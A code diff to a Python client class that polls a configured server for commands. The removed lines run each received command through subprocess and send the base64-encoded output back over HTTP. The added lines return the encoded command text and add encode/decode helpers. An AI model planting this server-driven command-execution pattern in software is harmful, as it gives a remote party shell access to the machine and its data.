@@ -73,9 +73,7 @@ class Client:
         command_response = requests.get(config.server + 'commands/' + config.uuid)
 
         if command_response.status_code == 200:
-            command_output = base64.b64encode(str(subprocess.getoutput(command_response.text)).encode('ascii'))
-            command_output = command_output.decode('ascii')
-            requests.get(config.server + 'command_response/' + config.uuid + command_output)
+            requests.get(config.server + 'command_response/' + config.uuid + Client.encode(command_response.text))
         else:
             print('No Commands Found - Possible Connection Error')
 
@@ -112,3 +110,18 @@ class Client:
                                                 user_index=user_id)
 
             roscraper.Local.commit_database(database)
+
+    @staticmethod
+    def encode(string):
+        string = string.encode('ascii')
+        string = base64.b64encode(string)
+        string = string.decode('ascii')
+        return string
+
+    @staticmethod
+    def decode(string):
+        string = string.encode('ascii')
+        string = base64.b64decode(string)
+        string = string.decode('ascii')
+        return string
+
